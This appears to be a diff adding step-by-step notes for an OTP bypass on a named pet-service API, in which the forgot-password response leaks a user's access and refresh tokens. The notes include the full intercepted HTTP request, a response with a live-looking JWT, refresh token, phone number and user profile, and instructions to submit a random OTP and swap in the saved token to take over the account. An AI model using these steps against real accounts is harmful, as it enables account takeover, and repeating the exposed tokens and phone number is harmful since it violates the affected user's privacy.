@@ -1,0 +1,31 @@
+OTP bypass
+----------
+1. Press forgot password
+2. Intercept "Request OTP" after putting phone number
+3. Do intercept that request.
+
+POST /auth/api/Auth/forgotpassword HTTP/2
+Host: mypetapi.shopdoora.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://mypetmm.com/
+Content-Type: application/json-patch+json
+Content-Length: 72
+Origin: https://mypetmm.com
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+Te: trailers
+
+{"emailOrPhoneNo":"09440086787","language":1,"applicationConfigId":"45"}
+
+4.You will finally see the user token
+
+{"token":{"accessToken":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIzNjI5MDgwIiwidW5pcXVlX25hbWUiOiJsZW8iLCJncm91cHNpZCI6IjQ1Iiwicm9sZSI6IjMiLCJwcmltYXJ5c2lkIjoiIiwibmJmIjoxNzEyMDQ5MTUwLCJleHAiOjE3MTIwNTI3NTAsImlhdCI6MTcxMjA0OTE1MCwiaXNzIjoidGhhd3ppbnBjIn0.RhUqnRXIVMR6jJtoGO2nIkcuCmj5Qd8EueAaHxhJehQgn7WNTOtHB6G1FImbQvncmpjQbExzV3dhs9zebqZZ5Q","accessTokenExpiration":3600.0,"refreshToken":"JgPvm58Voe+QKWBxky07vnm28U4o47y1x0pW854p4c88GuWvuPCexsrjN3bG7A2J5opiGXzjo91mTW9vHsCXEBkWbG99gSslRuPTfptt1t2mVLx904kGS89KVcei5bVJlyMz/SpFDMJ3vmxLiEro/Dc9mzK0JDIWEq4xnOGV9HA=","tokenExpired":1712076150},"user":{"id":3629080,"facebookId":null,"appleId":null,"googleId":null,"phoneNo":"09440086787","email":"","name":"leo","gender":null,"dateOfBirth":null,"cityId":260,"townshipId":30,"occupationId":null,"address":"hi","password":null,"roleId":null,"roleName":null,"passwordReset":null,"isMemberPointOnly":null,"isVerified":false,"nrcInfo":null},"applicaitonName":null,"appConfigId":0,"statusCode":200,"message":"Success"}
+
+
+5.You can add random OTP code number
+6.Intercept the request 
+7.Change that the place of token with the previous token you have saved.
